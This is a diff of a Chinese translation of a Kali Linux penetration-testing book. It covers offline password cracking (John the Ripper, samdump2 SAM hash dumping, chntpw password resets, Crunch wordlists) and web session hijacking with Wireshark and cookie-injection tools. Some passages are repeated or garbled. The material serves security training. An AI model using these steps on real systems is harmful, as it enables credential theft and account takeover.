+`Johnny` 是非常流行的 `John the Ripper` 密码破解工具的图形界面（GUI）。我们在第 3 章“服务端攻击”中介绍过 `John the Ripper` 的传统命令行版本。与命令行版本一样，`Johnny` 拥有多个引擎，允许它破解不同类型的密码，包括加密密码和哈希密码。`Johnny` 具有自动检测大多数哈希和加密密码的能力，使得渗透测试者的过程变得更容易。攻击者喜欢这个工具，因为它具有高度的可定制性，并且可以通过多种不同的方式配置以加速密码破解。
 
-> Johnny 中可能缺少某些自定义功能。对于大多数攻击，我们建议使用命令行 版本的 John the Ripper。
+> `Johnny` 中可能缺少某些自定义功能。对于大多数攻击，我们建议使用命令行 版本的 `John the Ripper`。
 
-John the Ripper 的运行方式如下：
+`John the Ripper` 的运行方式如下：
 
 - 尝试使用字典单词破解密码
 - 使用前后添加字母数字的字典单词
@@ -3145,23 +3130,23 @@ John the Ripper 的运行方式如下：
 - 运行混合了特殊字符的字典单词
 - 当所有其他方法失败时，尝试暴力破解
 
-要使用 Johnny，前往“密码攻击 | 离线攻击”并选择 Johnny。点击“打开密码文件”并选择你想破解的密码文件。以下截图显示了一个以用户 BOB、mary 和 joey 为目标的 shadow 文件。
+要使用 `Johnny`，前往“密码攻击 | 离线攻击”并选择 `Johnny`。点击“打开密码文件”并选择你想破解的密码文件。以下截图显示了一个以用户 BOB、mary 和 joey 为目标的 `shadow` 文件。
 
-当 Johnny 破解密码时，“密码”（Password）选项卡将被填充。
+当 `Johnny` 破解密码时，“密码”选项卡将被填充。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_174_0.png)
 
-Johnny 在左侧有配置选项卡。“选项”（Options）表格是你选择攻击类型的地方。以下截图显示了默认行为以及选择哈希类型的选项。Johnny 的自动检测准确率通常为 90%。
+`Johnny` 在左侧有配置选项卡。“选项”表格是你选择攻击类型的地方。以下截图显示了默认行为以及选择哈希类型的选项。`Johnny` 的自动检测准确率通常为 90%。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_174_png) [ 157 ]
 
-“统计”（Statistics）选项卡显示 Johnny 正在运行的会话。“设置”（Settings）选项卡指定了 Johnny 的运行路径：
+“统计”选项卡显示 `Johnny` 正在运行的会话。“设置”选项卡指定了 `Johnny` 的运行路径：
 
-> 注意，John the Ripper 的默认路径可能正确。在旧版本的 BackTrack 中，你必须手动将路径更新为 `/pentest/passwords/john`。Kali 1.0 的路径是 `/user/sbin/john`。
+> 注意，`John the Ripper` 的默认路径可能正确。在旧版本的 BackTrack 中，你必须手动将路径更新为 `/pentest/passwords/john`。Kali 1.0 的路径是 `/user/sbin/john`。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_175_0.png)
 
-“输出”（Output）选项卡展示 Johnny 正在攻击的状态。你还会发现错误信息。以下示例显示了 Johnny 识别哈希类型的消息：
+“输出”选项卡展示 `Johnny` 正在攻击的状态。你还会发现错误信息。以下示例显示了 `Johnny` 识别哈希类型的消息：
 
 > Warning: detected hash type "sha512"
 
@@ -3169,15 +3154,15 @@ Johnny 在左侧有配置选项卡。“选项”（Options）表格是你选择
 
 > Warning: detected hash type "sha512"
 
- 输出 选项卡展示 Johnny 正在攻击的状态。你还会发现错误信息。以下示例显示了 Johnny 识别哈希类型的消息：
+输出 选项卡展示 `Johnny` 正在攻击的状态。你还会发现错误信息。以下示例显示了 `Johnny` 识别哈希类型的消息：
 
 > Warning: detected hash type "sha512"
 
-> 157 也会 发现错误信息。以下示例显示了 Johnny 识别哈希类型的消息：
+> 157 也会 发现错误信息。以下示例显示了 `Johnny` 识别哈希类型的消息：
 
-> Warning: detected hash type "sha512" 
+> Warning: detected hash type "sha512"
 
- 输出 选项卡展示 Johnny 正在攻击的状态。你还会发现错误信息。以下示例显示了 Johnny 识别哈希类型的消息：
+输出 选项卡展示 `Johnny` 正在攻击的状态。你还会发现错误信息。以下示例显示了 `Johnny` 识别哈希类型的消息：
 
 > Warning: detected hash type "crypt"
 
@@ -3193,7 +3178,7 @@ Johnny 在左侧有配置选项卡。“选项”（Options）表格是你选择
 
 img/df1fdcde66c92c1fef83bd651dd5ffe3_176_0.png
 
-Johnny 将破解后的用户名填充到密码单元格。以下截图显示了破解的两个密码：
+`Johnny` 将破解后的用户名填充到密码单元格。以下截图显示了破解的两个密码：
 
 | 用户 | 密码 | 哈希 | 状态 |
 | :--- | :--- | :--- | :--- |
@@ -3207,24 +3192,21 @@ Johnny 将破解后的用户名填充到密码单元格。以下截图显示了�
 
 img/df1fdcde66c92c1fef83bd651dd5ffe3_176_1.png
 
-hashcat 和 oclHashcat 是密码破解工具。oclHashcat 是基于 GPGPU 的版本。hashcat/oclHashcat 实用是多线程工具，可以在单个攻击会话期间处理多个哈希和密码列表。hashcat/oclHashcat 工具提供了许多攻击选项，例如暴力破解、组合、字典、掩码和基于规则的攻击。
-
-
-
-
+`hashcat` 和 `oclHashcat` 是密码破解工具。`oclHashcat` 是基于 GPGPU 的版本。`hashcat`/`oclHashcat` 实用是多线程工具，可以在单个攻击会话期间处理多个哈希和密码列表。`hashcat`/`oclHashcat` 工具提供了许多攻击选项，例如暴力破解、组合、字典、掩码和基于规则的攻击。
 
 ### samdump2
 
-samdump2 是一个从 SAM 文件转储 Microsoft Windows 密码哈希值的工具，使其可以使用离线工具进行破解。对于较新版本的 Windows，你需要另一个工具来获取 SYSKEY（启动密钥）文件，以便访问存储在 SAM 数据库中的哈希。
+`samdump2` 是一个从 SAM 文件转储 Microsoft Windows 密码哈希值的工具，使其可以使用离线工具进行破解。对于较新版本的 Windows，你需要另一个工具来获取 SYSKEY（启动密钥）文件，以便访问存储在 SAM 数据库中的哈希。
 
-你可以在密码攻击 (Password Attacks) | 离线攻击 (Offline Attacks) | samdump2 下找到它。当你打开 samdump 时，会弹出一个终端窗口。
+你可以在密码攻击 (Password Attacks) | 离线攻击 (Offline Attacks) | `samdump2` 下找到它。当你打开 `samdump` 时，会弹出一个终端窗口。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_178_0.png)
 
-你必须挂载 Windows 系统，以便 samdump 能够访问 SAM 文件。
+你必须挂载 Windows 系统，以便 `samdump` 能够访问 SAM 文件。
 
 ```
 root@kali:-# mkdir /mnt/Windows
+
 root@kali:-# mount -t ntfs-3g /dev/hdb1/mnt/windows
 ```
 
@@ -3234,44 +3216,48 @@ root@kali:-# mount -t ntfs-3g /dev/hdb1/mnt/windows
 cp SAM SYSTEM /root/AttackDirectory
 ```
 
-进入攻击目录并执行 `bkhive SYSTEM bootkey` 以获取启动密钥。将启动密钥复制到文本文件中，以便 samdump 拥有带有启动密钥的 SAM 文件。
+进入攻击目录并执行 `bkhive SYSTEM bootkey` 以获取启动密钥。将启动密钥复制到文本文件中，以便 `samdump` 拥有带有启动密钥的 SAM 文件。
 
 ```bash
 cd /root/AttackDirectory
 > windowshashfiles.txt
 ```
 
-使用 `samdump SAM bootkey` 命令执行 samdump。将输出复制到第二个文本文件中。
+使用 `samdump SAM bootkey` 命令执行 `samdump`。将输出复制到第二个文本文件中。
 
 ```bash
 samdump2 SAM bootkey > windowshashfiles.txt
 ```
 
-现在使用 John the Ripper 等密码破解工具来破解哈希：
 
-### chntpw
 
-chntpw 是 Kali Linux、Backtrack 以及其他 Linux 发行版上的一个工具，用于重置 Windows 8 及早期版本的本地密码。它会修改 Windows 密码数据库。这主要用于在不知道密码时进入 Windows 机器。
+现在使用 `John the Ripper` 等密码破解工具来破解哈希：
+
+### `chntpw`
+
+`chntpw` 是 Kali Linux、Backtrack 以及其他 Linux 发行版上的一个工具，用于重置 Windows 8 及早期版本的本地密码。它会修改 Windows 密码数据库。这主要用于在不知道密码时进入 Windows 机器。
 
 ## 客户端攻击
 
-要使用 chntpw，请使用 Kali Live CD 启动 Windows 机器。下载 Kali Linux，请访问 http://www.kali.org/downloads/ 并下载 ISO 镜像。
+要使用 `chntpw`，请使用 Kali Live CD 启动 Windows 机器。下载 Kali Linux，请访问 http://www.kali.org/downloads/ 并下载 ISO 镜像。
 
 将 ISO 刻录到 CD 并使用 Live CD 启动 Windows 机器。在 Kali 的启动菜单中，选择取证 (Forensics) 选项。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_179_0.png)
 
-SAM 文件通常位于 /Windows/System32/config。你需要进入终端进入该目录。在你的系统上，它看起来可能像：
+SAM 文件通常位于 `/Windows/System32/config`。你需要进入终端进入该目录。在你的系统上，它看起来可能像：
 
-/media/hda1/Windows/System32/config
+`/media/hda1/Windows/System32/config`
 
 ```
 root@kali:/media/EC08E2D08E29ABA/Windows/System32/config# pwd
+
 /media/EC08E2D08E29ABA/Windows/System32/config
+
 root@kali:/media/EC08E2D08E29ABA/Windows/System32/config# 
 ```
 
-每个系统可能略有不同。在这个示例中，Kali 似乎正在使用你硬盘的序列号作为设备位置。这是因为我使用 Kali Live CD 启动了一个 Windows 7 虚拟机。SAM 数据库通常在 /media/name_of_hard_drive/Windows/System32/config。
+每个系统可能略有不同。在这个示例中，Kali 似乎正在使用你硬盘的序列号作为设备位置。这是因为我使用 Kali Live CD 启动了一个 Windows 7 虚拟机。SAM 数据库通常在 `/media/name_of_hard_drive/Windows/System32/config`。
 
 ## 第 4 章
 
@@ -3279,10 +3265,15 @@ root@kali:/media/EC08E2D08E29ABA/Windows/System32/config#
 
 ```
 root@kali:/media/EC08E2D08E29ABA/Windows/System32/config# ls -l SAM*
+
 -rw---- 1 root 262144 Jul 5 2013 SAM.LOG
+
 -rw---- 1 root 19224 Apr 12 2011 SAM.LOG
+
 -rw---- 2 root 256008 Jul 5 2013 SAM.LOG
+
 -rw---- 2 root 0 Jul 14 2009 SAM.LOG2
+
 root@kali:/media/EC08E2D08E29ABA/Windows/System32/config#
 ```
 
@@ -3296,11 +3287,17 @@ root@kali:/media/EC08E2D08E29ABA/Windows/System32/config#
 
 ```
 -- User Edit Menu:
+
 1 - Clear (blank) user password
+
 2 - Edit (set new) user password (在 XP 或 Vista 上操作需小心)
+
 3 - Promote user (将用户提升为管理员)
+
 4 - Unlock and enable user account (似乎已经解锁)
+
 q - Quit editing user, back to user select
+
 Select: (q) >
 ```
 
@@ -3308,47 +3305,57 @@ Select: (q) >
 
 ## 客户端攻击
 
-要访问 chntpw，请前往密码攻击 (Password Attacks) | 离线攻击 (Offline Attacks) | chntpw。将打开一个终端窗口，显示 chntpw 的欢迎界面。使用 chntpw 有几种方法，如主页上所示：
+要访问 `chntpw`，请前往密码攻击 (Password Attacks) | 离线攻击 (Offline Attacks) | `chntpw`。将打开一个终端窗口，显示 `chntpw` 的欢迎界面。使用 `chntpw` 有几种方法，如主页上所示：
 
 ```
 chntpw version 0.99.6 080526 (sixtyfour), (c) Petter N Hagen
+
 chntpw: change password of a user in a NT/2K/XP/2K3/Vista SAM file, or invoke registry editor
+
 chntpw [OPTIONS] <sam>[systemfile] [securityfile] [othersegue] [...]
+
 -u <user> This message
+
   Username to change, Administrator is default
+
   list all users in SAM file
+
   Interactive. List users (-l) then ask for user to change
+
   Registry editor. Now with full write support!
+
   Enter buffer debugger (hex editor).
+
 -t Trace hexdump of structs/segments. (弃用的调试函数)
+
 -v Be a little more verbose (for debugging)
+
 -n Write names of changed files to /tmp/changedfiles
+
   No allocation method. Only (old style) same length overwrites possible
 ```
 
 查看 readme 文件了解如何获取注册表文件以及它们是什么。源代码/二进制文件根据 GPL v2 许可证自由发布。详情见 readme。
 注意：此程序是
 
+`Crunch` 具有特殊字符，其对应的含义如下：
 
+- `+` / `-` @: 插入小写字母
+- `%`: 插入数字
+- `,`: 插入大写字母
+- `^`: 插入符号
 
-Crunch 具有特殊字符，其对应的含义如下：
-
-- + / - @: 插入小写字母
-- %: 插入数字
-- ,: 插入大写字母
-- ^: 插入符号
-
-在此示例中，我们假设知道目标密码是 `pass` 后面跟两个未知字符。要运行 Crunch 生成一个包含 `pass` 后跟两个未知数字的六位密码，请使用 `%%` 来代表任何数字。为了执行此操作并将输出放在文件名 `newpasswordwordlist.txt` 中，请使用示例输入：
+在此示例中，我们假设知道目标密码是 `pass` 后面跟两个未知字符。要运行 `Crunch` 生成一个包含 `pass` 后跟两个未知数字的六位密码，请使用 `%%` 来代表任何数字。为了执行此操作并将输出放在文件名 `newpasswordwordlist.txt` 中，请使用示例输入：
 
 ```
 root@kali:~# crunch 6 6 -t pass%% >> newpasswordwordlist.txt
 ```
-Crunch 现在将生成以下量的数据：700 bytes
+`Crunch` 现在将生成以下量的数据：700 bytes
 - MB
 - GB
 - TB
 - PB
-Crunch 现在将生成以下数量的行：100
+`Crunch` 现在将生成以下数量的行：100
 
 输出文件将包含所有可能的数字组合。下面的截图显示了输出文件的顶部：
 
@@ -3374,6 +3381,10 @@ Crunch 现在将生成以下数量的行：100
 ```
 root@kali:~# crunch 6 6 -t pass >> newpasswordlist.txt
 ```
+
+
+
+```
 Crunch 现在将生成以下量的数据：4732 bytes
 0 MB
 0 GB
@@ -3381,31 +3392,32 @@ Crunch 现在将生成以下量的数据：4732 bytes
 0 PB
 Crunch 现在将生成以下数量的行：676
 root@kali:~#
+```
 
 现在文本文件包含所有小写字母和数字，如下例所示：
 
 | 文件 编辑 搜索 选项 帮助 | | | |
 |---|---|---|---|
 | passbd | | | |
-| passbe | | | | |
+| passbe | | | |
 | passbf | | | |
-| passbg | | | | |
-| passbh | | | | |
-| passbi | | | | |
-| passbj | | | | |
-| passbk | | | | |
+| passbg | | | |
+| passbh | | | |
+| passbi | | | |
+| passbj | | | |
+| passbk | | | |
 | passbl | | | |
 | ... (列表其余部分) | | | |
 
-## Kali 中的其他可用工具
+# Kali 中的其他可用工具
 
 Kali 中还有其他实用工具。我们将列表限制在协助破解 Web 应用服务器的主机系统的工具。Kali 中还有其他未列在此列表中的密码破解工具；但这些工具的重点不在本文的范围之内。
 
-### Hash-identifier
+## Hash-identifier
 
-Hash-identifier 是一个用于识别哈希类型的 Python 工具。大多数密码破解工具（如 John the Ripper）都具有哈希自动检测功能，该功能非常好，准确率可能达到 90%。此工具可用于手动验证哈希类型。要使用 Hash-identifier，运行该工具并将哈希副本粘贴进去即可。
+`Hash-identifier` 是一个用于识别哈希类型的 Python 工具。大多数密码破解工具（如 John the Ripper）都具有哈希自动检测功能，该功能非常好，准确率可能达到 90%。此工具可用于手动验证哈希类型。要使用 `Hash-identifier`，运行该工具并将哈希副本粘贴进去即可。
 
-## 第 4 章
+# 第 4 章
 
 下面的截图显示了哈希的输出：
 
@@ -3415,7 +3427,7 @@ HASH: b6ddc0a05b3143888a9886f5da373a
 
 - 可能的哈希：
 - MDS
-- 缓存凭据 - MD4(($pass)).(strtolower($username))
+- 缓存凭据 - `MD4(($pass)).(strtolower($username))`
 
 - 可能的哈希：
 - Radmin V2.X
@@ -3426,39 +3438,47 @@ HASH: b6ddc0a05b3143888a9886f5da373a
 - MD4 (HMAC)
 - MD2 (HMAC)
 
-### dictstat
+## dictstat
 
-dictstat 是一个用于密码破解结果分析或常规字典列表的 Python 脚本工具。dictstat 将分析结果并为已经破解的密码组合提供暴力破解掩码（masks）。这可能会为破解该组更多哈希提供线索。在针对具有密码策略的公司时这非常有帮助。下面的截图显示了 dictstat 界面：
+`dictstat` 是一个用于密码破解结果分析或常规字典列表的 Python 脚本工具。`dictstat` 将分析结果并为已经破解的密码组合提供暴力破解掩码（masks）。这可能会为破解该组更多哈希提供线索。在针对具有密码策略的公司时这非常有帮助。下面的截图显示了 `dictstat` 界面：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_188_1.png)
 
 ## 客户端攻击
 
-要运行 dictstat，输入 `dictstat [options] passwords.txt`。下面的截图显示了使用 dictstat 的示例：
+要运行 `dictstat`，输入 `dictstat [options] passwords.txt`。下面的截图显示了使用 `dictstat` 的示例：
 
 ```
 root@kali:# dictstat /root/Desktop/A0.md.hash
+
 (?) Psycho is not available, Install Psico for faster parsing.\32-bit systems
+
 [-] 正在 passwords: /root/Desktop/A0.md.hash
+
 [-] 正在 100% (102/102) passwords
+
 NOTE: 以下统计数据相对于分析的密码数量，
+
 总密码数量
 
 [-] 行数统计...
+
 32: 100% (102)
+
 [-] 掩码统计...
+
 othermask: 100% (102)
+
 [-] 字符集统计...
+
 loweralphanum: 100% (102) you you become, the more you are to learn
+
 [-] 进阶掩码统计...
+
 root@kali:~#
 ```
 
-
-
-
-
-# 攻击身份认证
+## 攻击身份认证
 
 许多政府机构利用个人身份验证（PIV）或通用访问卡（CAC）配合密码，以满足用户“所拥有”和“已知”的内容。远程工作人员通常使用数字令牌，每隔几秒生成一个新数字并配合 PIN 码来代表他们“所拥有”和“已知”。高安全性物理位置可能需要指纹扫描配合 PIN 码才能访问。网络访问控制技术可以验证用户如何登录笔记本电脑，并在提供网络资源之前寻找隐藏证书以验证系统和用户的身份。在渗透测试的侦察阶段，识别目标所使用的身份认证方法至关重要，这样你就可以制定策略来绕过该信任。
 
@@ -3482,17 +3502,19 @@ root@kali:~#
 <a href="http://www.badfacebook.com">Visit Us on Facebook.com</a>
 ```
 
+
+
 # 攻击身份认证
 
-点击劫持比更改链接更恶意、更复杂。使用点击劫持的攻击者通常会将 IFrame 嵌入网页中。IFrame 的内容包含来自目标网站的数据，并通常放置在合法链接之上，使其难以检测。
+点击劫持比更改链接更恶意、更复杂。使用点击劫持的攻击者通常会将 `IFrame` 嵌入网页中。`IFrame` 的内容包含来自目标网站的数据，并通常放置在合法链接之上，使其难以检测。
 
-为了构建你的点击劫持攻击，你可以使用 Paul Stone 开发的点击劫持工具，下载地址为为：http://www.contextis.com/research/tools/clickjacking-tool。
+为了构建你的点击劫持攻击，你可以使用 Paul Stone 开发的点击劫持工具，下载地址为：`http://www.contextis.com/research/tools/clickjacking-tool`。
 
 一旦你下载了该工具，就可以使用它从另一个网站获取代码，例如投票按钮或点赞按钮。点击劫持工具兼容 Firefox 3.6。Paul Stone 的工具将不支持较新版本的 Firefox；但是，你可以在 Kali 军库中运行多个版本的 Firefox，包括 Firefox 3.6 或更早版本。
 
 > 网站代码经常变化，因此请确保调整你的攻击以适应镜像受信任网站的更新。
 
-### 劫持 Web 会话 Cookie
+## 劫持 Web 会话 Cookie
 
 Cookie 是从网站发送并在用户访问该网站时存储在用户浏览器中的一小段数据。网站可以使用 Cookie 验证用户是否返回了该站点，并获取有关用户之前操作的详细信息。这可能包括访问了哪些页面、如何登录、以及按了哪些按钮。每当你登录网站（如 Facebook、Gmail 或 Wordpress）时，你的浏览器都会为你分配一个 Cookie。
 
@@ -3500,15 +3522,15 @@ Cookie 可以包含对用户长时间的追踪历史，包括多年前在网站�
 
 会话劫持攻击存在一些局限性：
 
-- 如果目标使用 https:// 进行浏览并启用了端到端加密，窃取 Cookie 是没用的。尽管采用速度缓慢；但大多数安全的网站都提供了这种防止会话劫持攻击的防御。
+- 如果目标使用 `https://` 进行浏览并启用了端到端加密，窃取 Cookie 是没用的。尽管采用速度缓慢；但大多数安全的网站都提供了这种防止会话劫持攻击的防御。
 
-> 你可以使用 SSLStrip 作为一种方法，防止目标在启动会话劫持或其他攻击之前建立 https 连接。有关 SSLStrip 的更多信息，请参见第 3 章服务器端攻击。
+  你可以使用 `SSLStrip` 作为一种方法，防止目标在启动会话劫持或其他攻击之前建立 `https` 连接。有关 `SSLStrip` 的更多信息，请参见第 3 章服务器端攻击。
 
 - 大多数 Cookie 在目标注销会话时过期。这也会导致攻击者注销会话。这对于利用永不过期的 Cookie 的移动应用来说是一个问题，这意味着如果捕获了有效的会话令牌，攻击者可以获得永久访问权限。
 
 许多网站不支持并行登录，这使得被盗的 Cookie 失效。
 
-### Web 会话工具
+## Web 会话工具
 
 下一节将介绍用于渗透测试 Web 会话的工具。某些工具在 Kali 1.0 中不可用；但可以从网上获得。
 
@@ -3524,12 +3546,6 @@ Firesleep 是一种用于审核 Web 会话的经典渗透测试工具。Fireslee
 
 > Firefox 的 Firesleep 插件在 Windows 和 MAC 上官方支持，使其在 Linux 上操作非常不便。可以使用自定义工作使 Firesleep 在 Linux 环境中运行；但建议使用更现代的工具。
 
-
-
-
-
-## 第 5 章
-
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_198_0.png)
 
 **查看 Cookie 信息 (View Cookie Information)**，你将看到存储的 Cookie。你可以点击**编辑 Cookie (Edit Cookie)** 打开 Cookie 编辑器，并用受害者窃取的 Cookie 替换当前 Cookie。
@@ -3539,10 +3555,6 @@ Firesleep 是一种用于审核 Web 会话的经典渗透测试工具。Fireslee
 ### Greasemonkey – Firefox 插件
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_198_2.png)
-
-[ 181 ]
-
-## 攻击身份验证
 
 Greasemonkey 是一个 Firefox 插件，允许用户安装脚本，这些脚本可以在页面加载前后动态更改页面内容。Greasemonkey 可用于自定义网页外观、网页功能、调试、合并其他页的数据以及其他目的。为了让 Cookie Injector 等其他工具正常工作，需要安装 Greasemonkey。
 
@@ -3556,7 +3568,7 @@ Cookie Injector 是一个用户脚本，简化了操作浏览器 Cookie 的过�
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_199_0.png)
 
-安装 Cookie Injector 脚本后，按 Alt+C 显示 Cookie 对话框。将复制的 Wireshark 字符串粘贴到输入框中并点击 OK 将 Cookie 注入到当前页面。参阅 Wireshark 部分，了解如何使用复制 (Copy)”、“字节 (Bytes)”以及在 Wireshark 中选择仅可打印文本 (Printable Text Only)来为 Cookie Injector 复制 Cookie。接两张截图显示了按下 Alt+C、粘贴 Wireshark Cookie 转储并点击 OK，看到显示捕获的 Cookie 已写入浏览器的弹出窗口。
+安装 Cookie Injector 脚本后，按 `Alt+C` 显示 Cookie 对话框。将复制的 Wireshark 字符串粘贴到输入框中并点击 OK 将 Cookie 注入到当前页面。参阅 Wireshark 部分，了解如何使用“复制 (Copy)”、“字节 (Bytes)”以及在 Wireshark 中选择仅可打印文本 (Printable Text Only)来为 Cookie Injector 复制 Cookie。接下来两张截图显示了按下 `Alt+C`、粘贴 Wireshark Cookie 转储并点击 OK，看到显示捕获的 Cookie 已写入浏览器的弹出窗口。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_199_1.png)
 
@@ -3568,11 +3580,9 @@ Cookies Manager 是一个用于查看、编辑和创建新 Cookie 的工具。Co
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_200_0.png)
 
-Cookies Manager+ 将显示 Firefox 捕获的所有 Cookie。你可以向下滚动或搜索特定的 Cookie 以查看和/或编辑它们。在我的示例中，我正在寻找与 www.theblogger.com 相关的任何 Cookie。
+Cookies Manager+ 将显示 Firefox 捕获的所有 Cookie。你可以向下滚动或搜索特定的 Cookie 以查看和/或编辑它们。在我的示例中，我正在寻找与 `www.theblogger.com` 相关的任何 Cookie。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_200_1.png)
-
-## 攻击身份验证
 
 Cookies Manager+ 让编辑现有 Cookie 变得简单。这对于执行各种类型的攻击（如会话劫持和 SQL 注入）非常有用。
 
@@ -3582,28 +3592,21 @@ Cookies Manager+ 让编辑现有 Cookie 变得简单。这对于执行各种类�
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_201_1.png)
 
-Cookie Cadger 是用于审计网络会话的渗透测试工具。Cookie Cadger 可以包含详细的 HTTP 请求捕和重放不安全的 HTTP GET 请求、请求项、用户代理、引用页和基础授权。Cookie Cadger 可以为 Wi-Fi 和有线网络提供实时分析；以及加载数据包获 (PCAP) 文件。Cookie Cadger 还包含会话检测，以判断用户是否登录了 Wordpress 和 Facebook 等网页。Cookie Cadger 被人认为是“加强版的 Firesheep”。
+Cookie Cadger 是用于审计网络会话的渗透测试工具。Cookie Cadger 可以捕获详细的 HTTP 请求并重放不安全的 HTTP GET 请求、请求项、用户代理、引用页和基础授权。Cookie Cadger 可以为 Wi-Fi 和有线网络提供实时分析；以及加载数据包捕获 (PCAP) 文件。Cookie Cadger 还包含会话检测，以判断用户是否登录了 Wordpress 和 Facebook 等网页。Cookie Cadger 被人认为是“加强版的 Firesheep”。
 
 > Cookie Cadger 不随 Kali 1.0 版本提供。
 
-可以从 www.cookiecadger.com 下载 Cookie Cadger。下载将是一个 JAR 文件。双击文件打开 Cookie Cadger。会弹出一个警告，询问你是否要启用会话检测。点击“是”，主仪表板将弹出。接两张截图显示了带有介绍警告消息的 Cookie Cadger 1.0 JAR 文件以及主 Cookie Cadger 仪表板。
-
-[ 184 ]
+可以从 `www.cookiecadger.com` 下载 Cookie Cadger。下载将是一个 JAR 文件。双击文件打开 Cookie Cadger。会弹出一个警告，询问你是否要启用会话检测。点击“是”，主仪表板将弹出。接下来两张截图显示了带有介绍警告消息的 Cookie Cadger 1.0 JAR 文件以及主 Cookie Cadger 仪表板。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_202_0.png)
 
 开始，选择合适的界面并点击“开始捕获 (Start Capture)”。如果可用，Cookie Cadger 提供了接入多个接口的能力。
 
-## 攻击身份验证
-
 Cookie Cadger 可以枚举可用网络上发现的所有设备。例如，下一张截图显示了一个 Linux [图像占位符]。
 
 | 请求 (Requests) | 域名 (Domains) |
 | :--- | :--- |
-| 00:0c:29:4f:84:73 | www.theblogger.com |
-
-
-
+| 00:0c:29:4f:84:73 | `www.theblogger.com` |
 
 Wireshark 捕获了线路上看到的所有流量。可以通过在过滤器栏中输入特定项目或通过表格（如协议或分段）调整数据来过滤流量。
 
@@ -3622,7 +3625,7 @@ Wireshark 捕获了线路上看到的所有流量。可以通过在过滤器栏�
 | 293 | 00:05:18.294000 | 192.168.1.137 | 172.16.1.1 | TLSv1 | 91 Application Data |
 | 294 | 00:05:18.295000 | 192.168.1.137 | 172.16.1.1 | TCP | 54104 [Ack] [Acq=969 Ack-2342 |
 
-- 帧 1: 线上 54 字节（62 字节），接口 eth0 捕获到 54 字节（62 字节）
+- 帧 1: 线上 54 字节（62 字节），接口 `eth0` 捕获到 54 字节（62 字节）
 - 以太网 II, 源: 00:00:5e:8a:48:73, 目的: 00:00:5e:8a:48:73, 类型: 0x0800
 - 网协议版本4, 源: 172.16.1.1, 目的: 199.147.78.172, ID: 1, 长度: 0
 - 传输控制协议, 源端口: 57737 (57737), 目的端口: 80; 序列: 1, 确认: 1, 长度: 712
@@ -3633,71 +3636,84 @@ Wireshark 会记录本地流量的详情，例如用于 cookie 的参数。例�
 
 | 序号 | 时间 | 源 | 目的地 | 协议 | 信息 |
 |---|---|---|---|---|---|
-| 2133 | 20:06:59.635000 | 31 | 30 | HTTP | 824 GET /login.php?redirect_to=main.com?ser=v |
-| 2147 | 20:06:59.6417600 | 31 | 30 | HTTP | 1048 GET /admin.php?id=3 |
-| 2154 | 20:06:59.6542800 | 31 | 30 | HTTP | 1024 GET /wp-admin.php |
-| 2175 | 20:06:59.6752800 | 31 | 30 | HTTP | 1051 GET /wp-content/colors/fresh.css |
-| 2179 | 20:06:59.6802800 | 31 | 30 | HTTP | 1024 GET /wp-includes/js.js |
-| 2185 | 20:06:59.6872600 | 31 | 30 | HTTP | 1052 GET /wp-includes/js/jquery.js?version=v |
-| 2189 | 20:06:59.693800 | 31 | 30 | HTTP | 1024 GET /wp-content/plugins/1-flash-gallery |
-| 2193 | 20:06:59.701300 | 31 | 30 | HTTP | 1024 GET /wp-content/plugins/slider |
-| 2209 | 20:06:59.721650 | 31 | 30 | HTTP | 1058 GET /wp-content/plugins/gd-rating |
-| 2222 | 20:06:59.736180 | 31 | 30 | HTTP | 1045 GET /wp-includes/js/thickbox.js |
+| 2133 | 20:06:59.635000 | 31 | 30 | HTTP | 824 `GET /login.php?redirect_to=main.com?ser=v` |
+| 2147 | 20:06:59.6417600 | 31 | 30 | HTTP | 1048 `GET /admin.php?id=3` |
+| 2154 | 20:06:59.6542800 | 31 | 30 | HTTP | 1024 `GET /wp-admin.php` |
+| 2175 | 20:06:59.6752800 | 31 | 30 | HTTP | 1051 `GET /wp-content/colors/fresh.css` |
+| 2179 | 20:06:59.6802800 | 31 | 30 | HTTP | 1024 `GET /wp-includes/js.js` |
+| 2185 | 20:06:59.6872600 | 31 | 30 | HTTP | 1052 `GET /wp-includes/js/jquery.js?version=v` |
+| 2189 | 20:06:59.693800 | 31 | 30 | HTTP | 1024 `GET /wp-content/plugins/1-flash-gallery` |
+| 2193 | 20:06:59.701300 | 31 | 30 | HTTP | 1024 `GET /wp-content/plugins/slider` |
+| 2209 | 20:06:59.721650 | 31 | 30 | HTTP | 1058 `GET /wp-content/plugins/gd-rating` |
+| 2222 | 20:06:59.736180 | 31 | 30 | HTTP | 1045 `GET /wp-includes/js/thickbox.js` |
 
-- 帧 2127: 线上 766 字节（628 字节），接口 eth0 捕获到 766 字节（628 字节）
+- 帧 2127: 线上 766 字节（628 字节），接口 `eth0` 捕获到 766 字节（628 字节）
 - 以太网 II, 源: 00:00:5e:8a:48:73, 目的: 00:00:5e:8a:48:73, 类型: 0x0800
 - 网协议版本4, 源: 172.16.1.1, 目的: 199.147.78.172, ID: 1, 长度: 712
 - 传输控制协议, 源端口: 57737 (57737), 目的端口: 80; 序列: 1, 确认: 1, 长度: 712
-
-## 攻击身份
 
 一旦捕获到不安全的 cookie，你必须使用另一个工具将其注入浏览器以完成会话。选择受害者，点击该行并选择“Bytes Only”。现在你可以将其粘贴到 Firefox 插件 Cookie Injector 中完成会话攻击。
 
 ### Bettercap
 
-Bettercap 是一种用于 HTTP 会话劫持（也称为 Sidejacking）窃取 cookie 的实用。它监听网络，捕获看到的 cookie 并将其导入浏览器环境，以便攻击者可以重放会话。有很多支持 Wireshark 捕获并简化数据的有用工具。例如可以从 www.bettercap.com 免费下载 Bettercap。
